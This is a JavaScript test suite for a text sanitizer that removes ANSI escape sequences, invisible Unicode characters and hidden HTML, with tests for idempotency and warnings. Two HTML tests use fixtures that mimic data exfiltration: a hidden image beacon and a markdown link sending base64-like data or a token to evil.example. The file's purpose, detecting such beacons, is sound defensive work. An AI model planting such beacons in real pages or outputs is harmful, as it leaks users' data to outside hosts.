/**
 * Tests for the top-level `sanitize` convenience entry: Layer-1 ANSI/ESC
 * neutralization + idempotency, lone-surrogate normalization, the leading-BOM
 * exception, and the opt-in HTML path (Layers 2 & 3).
 */
import { describe, it } from "node:test";
import assert from "node:assert/strict";

import { sanitize, CATEGORY } from "../src/index.mjs";
import { cp } from "./test-helpers.mjs";

const ESC = cp(0x1b);
const ZW = cp(0x200b);

// ─── Layer 1: no raw ESC survives (reassembly + idempotency) ─────────────────

describe("sanitize: Layer 1 ESC neutralization + idempotency", () => {
  for (const [name, input, expected] of [
    ["invisible at the introducer", `${ESC}${ZW}[32m payload`, " payload"],
    ["invisible after the bracket", `${ESC}[${ZW}32m payload`, " payload"],
    [
      "two invisibles in one sequence",
      `${ESC}${ZW}[${ZW}32m payload`,
      " payload",
    ],
    [
      "nested split (incomplete residual)",
      `${ESC}${ZW}[${ESC}${ZW}[32m payload`,
      "[ payload",
    ],
    [
      // Digits are never a valid CSI final byte (ECMA-48 finals are
      // 0x40-0x7E), so `ESC[3` alone is not a complete sequence; the
      // invisible-strip pass reconstitutes the full `ESC[32m` (a complete,
      // legitimate SGR color sequence), which the re-strip pass then removes.
      "post-introducer split (one-pass)",
      `${ESC}[3${ZW}2m payload`,
      " payload",
    ],
    [
      "ANSI removal reconstitutes a sequence",
      `${ESC}${ESC}[32m[0m payload`,
      " payload",
    ],
    [
      "doubly nested ANSI reconstitution",
      `${ESC}${ESC}${ESC}[32m[31m[0m payload`,
      " payload",
    ],
  ]) {
    it(`reduces to its exact clean text and is idempotent (${name})`, async () => {
      const first = await sanitize(input);
      assert.ok(
        !first.cleaned.includes(ESC),
        `ESC survived: ${JSON.stringify(first.cleaned)}`,
      );
      assert.equal(first.cleaned, expected);
      assert.ok(first.found.includes(CATEGORY.ANSI));
      const second = await sanitize(first.cleaned);
      assert.equal(second.cleaned, first.cleaned);
      assert.deepEqual(second.found, []);
    });
  }

  it("leaves clean text untouched (no spurious modification)", async () => {
    const out = await sanitize("plain text, no escapes");
    assert.equal(out.cleaned, "plain text, no escapes");
    assert.deepEqual(out.found, []);
    assert.deepEqual(out.warnings, []);
  });

  it("strips an invisible with no ANSI without reporting ANSI escapes", async () => {
    const out = await sanitize(`foo${ZW}bar`);
    assert.equal(out.cleaned, "foobar");
    assert.deepEqual(out.found, [CATEGORY.CF]);
  });

  it("strips a non-SGR escape (cursor move) too — the ESC introducer is the hazard", async () => {
    const out = await sanitize(`${ESC}[2Jhello`);
    assert.ok(!out.cleaned.includes(ESC));
    assert.ok(out.found.includes(CATEGORY.ANSI));
  });

  it("strips a complete 8-bit C1 CSI sequence (U+009B introducer)", async () => {
    const out = await sanitize(`${cp(0x9b)}32m payload`);
    assert.ok(!out.cleaned.includes(cp(0x9b)));
    assert.equal(out.cleaned, " payload");
    assert.ok(out.found.includes(CATEGORY.ANSI));
  });

  it("sweeps a lone/incomplete C1 CSI introducer (U+009B), reporting it", async () => {
    const out = await sanitize(`a${cp(0x9b)}b`);
    assert.ok(!out.cleaned.includes(cp(0x9b)), "U+009B survived the sweep");
    assert.equal(out.cleaned, "ab");
    assert.ok(out.found.includes(CATEGORY.ANSI));
    // The sweep must honor the no-silent-suppression contract deterministically,
    // not just probabilistically via the fuzz postcondition.
    assert.ok(out.warnings.length > 0, "swept a byte without warning");
  });
});

// ─── Layer 1: BOM / fillers / variation selectors / long run ─────────────────

describe("sanitize: Layer 1 invisible classes", () => {
  it("strips interior BOM, preserves leading BOM", async () => {
    const out = await sanitize(`${cp(0xfeff)}hello${cp(0xfeff)}world`);
    assert.equal(out.cleaned, `${cp(0xfeff)}helloworld`);
    assert.match(out.warnings.join(" "), /Stripped: Format/);
  });
  it("preserves a single leading BOM with no warning", async () => {
    const out = await sanitize(`${cp(0xfeff)}clean leading bom`);
    assert.equal(out.cleaned, `${cp(0xfeff)}clean leading bom`);
    assert.deepEqual(out.warnings, []);
  });
  it("strips blank-rendering fillers that are not category Cf", async () => {
    const out = await sanitize(`vis${cp(0x3164)}${cp(0x2800)}ible`);
    assert.equal(out.cleaned, "visible");
    assert.match(out.warnings.join(" "), /Blank-rendering fillers/);
  });
  it("reports the Variation-selectors category by its label", async () => {
    const out = await sanitize(`hi${cp(0xfe0f)}${cp(0xe0101)}de`);
    assert.equal(out.cleaned, "hide");
    assert.match(out.warnings.join(" "), /Variation selectors/);
  });
  it("appends a LONG RUN note when a payload-length invisible run is present", async () => {
    const out = await sanitize(`x${cp(0x200b).repeat(12)}y`);
    assert.equal(out.cleaned, "xy");
    assert.match(out.warnings.join(" "), /LONG RUN/);
  });
  it("omits the LONG RUN note for a short invisible run", async () => {
    const out = await sanitize(`x${cp(0x200b).repeat(3)}y`);
    assert.equal(out.cleaned, "xy");
    assert.doesNotMatch(out.warnings.join(" "), /LONG RUN/);
  });
});

// ─── Layer 1: lone-surrogate normalization ───────────────────────────────────

describe("sanitize: lone-surrogate normalization", () => {
  it("replaces a lone high surrogate with U+FFFD and warns", async () => {
    const out = await sanitize(`a${String.fromCharCode(0xd800)}b`);
    assert.equal(out.cleaned, `a${cp(0xfffd)}b`);
    assert.ok(out.found.includes(CATEGORY.LONE_SURROGATES));
    assert.match(out.warnings.join(" "), /Normalized lone UTF-16 surrogates/);
  });
  it("leaves a valid surrogate pair (emoji) intact", async () => {
    const out = await sanitize(`a${cp(0x1f600)}b`);
    assert.equal(out.cleaned, `a${cp(0x1f600)}b`);
    assert.deepEqual(out.warnings, []);
  });
});

// ─── No silent suppression contract ──────────────────────────────────────────

describe("sanitize: no silent suppression", () => {
  it("an unchanged input yields empty found/warnings", async () => {
    const out = await sanitize("just regular text");
    assert.equal(out.cleaned, "just regular text");
    assert.deepEqual(out.found, []);
    assert.deepEqual(out.warnings, []);
  });
  it("any change carries at least one warning", async () => {
    const out = await sanitize(`${ESC}[31mx${cp(0x200b)}y`);
    assert.notEqual(out.cleaned, `${ESC}[31mx${cp(0x200b)}y`);
    assert.ok(out.warnings.length > 0);
  });
});

// ─── HTML path (opt-in) ──────────────────────────────────────────────────────

describe("sanitize: html=false leaves HTML untouched", () => {
  it("does not splice hidden HTML when html is not requested", async () => {
    const input = "before <span hidden>SECRET</span> after";
    const out = await sanitize(input);
    assert.equal(out.cleaned, input);
    assert.deepEqual(out.warnings, []);
  });
});

// ─── options robustness / text type validation (facade contract) ────────────

describe("sanitize: options robustness and text-type validation", () => {
  it("treats an explicit null options the same as omitted (regression: destructuring null threw TypeError)", async () => {
    const withNull = await sanitize("x", null);
    const omitted = await sanitize("x");
    assert.deepEqual(withNull, omitted);
    assert.equal(withNull.cleaned, "x");
  });

  it("treats an explicit undefined options the same as omitted", async () => {
    const withUndefined = await sanitize("x", undefined);
    const omitted = await sanitize("x");
    assert.deepEqual(withUndefined, omitted);
  });

  it("still honors options when a real options object is passed alongside null-safety", async () => {
    const out = await sanitize("before <!-- hidden --> after", { html: true });
    assert.doesNotMatch(out.cleaned, /hidden/);
  });

  it("throws a clear, named TypeError when text is not a string (regression: was an internal TypeError from deep inside applyLayer1)", async () => {
    await assert.rejects(
      () => sanitize(42),
      (err) => {
        assert.ok(err instanceof TypeError);
        assert.match(err.message, /text must be a string/);
        return true;
      },
    );
  });

  it("throws the same clear TypeError for other non-string text shapes", async () => {
    for (const badText of [null, undefined, {}, [], true]) {
      await assert.rejects(
        () => sanitize(badText),
        (err) =>
          err instanceof TypeError && /text must be a string/.test(err.message),
      );
    }
  });
});

describe("sanitize: html=true runs Layers 2 & 3", () => {
  it("splices a hidden element and an HTML comment, reporting both", async () => {
    const out = await sanitize("x <!-- c --> y <span hidden>SECRET</span> z", {
      html: true,
    });
    assert.doesNotMatch(out.cleaned, /SECRET/);
    assert.ok(out.found.includes(CATEGORY.HTML_COMMENTS));
    assert.ok(out.found.includes(CATEGORY.HIDDEN_HTML));
    assert.match(out.warnings.join(" "), /HTML sanitized/);
  });

  it("reports a preserved script tag without removing it", async () => {
    const out = await sanitize("see <script>x</script> source", { html: true });
    assert.match(out.cleaned, /<script>x<\/script>/);
    // A NOTE, not a warning: nothing was removed and nothing was hidden, and a
    // <script> is on essentially every page ever fetched.
    assert.deepEqual(out.warnings, []);
    assert.match(out.notes.join(" "), /Scripting\/resource content present/);
  });

  it("reports a preserved data: URI resource (dataSrc count)", async () => {
    const out = await sanitize('<img src="data:text/html,x">', { html: true });
    assert.equal(out.cleaned, '<img src="data:text/html,x">');
    assert.match(out.notes.join(" "), /1 data: URI resource\(s\)/);
  });

  it("detects an exfil URL hidden inside a stripped element (pre-splice scan)", async () => {
    const b64 = "A".repeat(44);
    const out = await sanitize(
      `<div hidden><img src="https://evil.example/x?data=${b64}"></div>`,
      { html: true },
    );
    // The beacon is spliced out of the cleaned text...
    assert.doesNotMatch(out.cleaned, /evil\.example/);
    // ...but still reported, because the exfil scan runs on the pre-splice text.
    assert.ok(out.found.includes(CATEGORY.EXFIL_URLS));
    // An <img src>: the renderer fetches it, so it is a warning.
    assert.match(out.warnings.join(" "), /evil\.example/);
  });

  it("flags a markdown exfil link", async () => {
    const out = await sanitize(
      "[c](https://evil.example/t?token=" + "A".repeat(44) + ")",
      { html: true },
    );
    assert.ok(out.found.includes(CATEGORY.EXFIL_URLS));
    // A plain link exfiltrates nothing until someone follows it, and the line
    // reporting it says not to — so it is reported at NOTE volume. `found`
    // still carries the machine-readable code either way.
    assert.deepEqual(out.warnings, []);
    assert.match(out.notes.join(" "), /URLs shaped like data exfiltration/);
  });

  it("returns benign HTML unchanged with no warnings on the html path", async () => {
    const out = await sanitize("hello <b>world</b>", { html: true });
    assert.equal(out.cleaned, "hello <b>world</b>");
    assert.deepEqual(out.warnings, []);
    assert.deepEqual(out.notes, []);
    assert.deepEqual(out.found, []);
  });

  it("runs Layer 1 before the HTML layer (invisible inside HTML is stripped)", async () => {
    const out = await sanitize(`hi${ZW} <b>there</b>`, { html: true });
    assert.equal(out.cleaned, "hi <b>there</b>");
    assert.ok(out.found.includes(CATEGORY.CF));
  });
});
